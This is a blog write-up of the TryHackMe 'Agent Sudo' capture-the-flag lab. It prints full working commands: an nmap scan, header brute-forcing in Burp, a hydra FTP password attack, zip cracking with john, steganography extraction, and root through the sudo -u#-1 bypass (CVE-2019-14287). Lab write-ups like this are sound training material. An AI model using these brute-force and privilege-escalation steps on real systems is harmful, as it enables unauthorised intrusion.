---
layout: post
title:  "Tryhackme: Agent Sudo"
date:   2021-02-11 19:57:56 +0200
categories: tryhackme
---

## Nmap Scan ##

### Initial Port Scan ###
```
sudo nmap -sS -T5 -p- 10.10.253.16 -vv
```
```
Nmap scan report for 10.10.253.16
Host is up, received reset ttl 63 (0.077s latency).
Scanned at 2021-02-11 16:05:19 EST for 147s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
 ### Targeted Port Scan ###
 ```
 sudo nmap -sSCV -T5 -p 21,22,80 -vv 10.10.253.16
 ```
 ```
 Nmap scan report for 10.10.253.16
Host is up, received reset ttl 63 (0.10s latency).
Scanned at 2021-02-11 16:13:21 EST for 25s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## User-Agent Bruteforcing ##
After attempting a ```nikto``` and a ```gobuster``` scan and coming up empty handed, I decided to further investigate the suggestion offered by the main web page regarding the ```User-Agent```.
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

Thus, by building an alphabet wordlist containing the uppercase letters of the alphabet and bruteforcing the ```GET``` request through ```Burp Suite```, we are met by this response for the ```User-Agent: C```:
Request:
```
GET / HTTP/1.1
Host: 10.10.253.16
User-Agent: C
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
Response:
```
HTTP/1.1 302 Found
Date: Thu, 11 Feb 2021 21:24:49 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: agent_C_attention.php
Content-Length: 218
Connection: close
Content-Type: text/html; charset=UTF-8


<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

Thus, by accessing the path ```agent_C_attention.php```, we are met by the following web page:
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

And this is how we've obtained a potential username.

## Hash cracking and brute-force ##
### FTP Bruteforcing ###
We will use ```hydra``` to bruteforce ```FTP``` credentials:
```
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.253.16 -t 16 ftp -V 
```
Making our way through the FTP server with the newly found credentials we find we can download some files:
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
ftp> get cute-alien.jpg
ftp> get cutie.png
```
The text file suggests us we are dealing with a steganography challenge:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

### Zip Bruteforcing ###
Extracting the fake image indicated in the previous note we get multiple files:
```
$ binwalk cutie.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
$ cd _cutie.png.extracted
$ ls
365  365.zlib  8702.zip  To_agentR.txt
```

Let's bruteforce the zip using ```john```
```
$ zip2john 8702.zip > hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
$ john 8702.zip hash                                     
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE 2/3 (2021-02-12 05:31) 0.9900g/s 43552p/s 43552c/s 43552C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Using ```steghide``` on the image ###
Decoding the ```base64``` string offered inside the newly obtained text file we get another password:
```
$ echo "QXJlYTUx" | base64 -d
Area51
```
This password happens to be the passphrase for the ```cute-alien.jpg``` image:
```
$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
$ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

And this is how we get our ```SSH``` password.

## Capture the user flag ##
Let's login with the previously found ```SSH``` credentials and get our user flag:
```
$ ssh james@10.10.144.178                                                                                  130 ⨯
james@10.10.144.178's password: 
Permission denied, please try again.
james@10.10.144.178's password: 

                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ ssh james@10.10.144.178                                                                                  130 ⨯
james@10.10.144.178's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
```

Next let's download the shown image file on our machine
```
$ scp james@10.10.144.178:/home/james/Alien_autospy.jpg .
james@10.10.144.178's password: 
Alien_autospy.jpg                                                                100%   41KB 101.5KB/s   00:00  
```
![Alien image](./assets/images/Agent-Sudo/Alien_autospy.png)
Doing a reverse image search on this we obtain the name of the incident.

## Privilege escalation ##
Looking at james' permissions we see that we are allowed to ru n ```/bin/bash``` as any user other than root:
```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
So, we have to do with [CVE-2019-14287](https://www.exploit-db.com/exploits/47502).

And this is how we get our flag
```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~# cat /root/root.txt 
```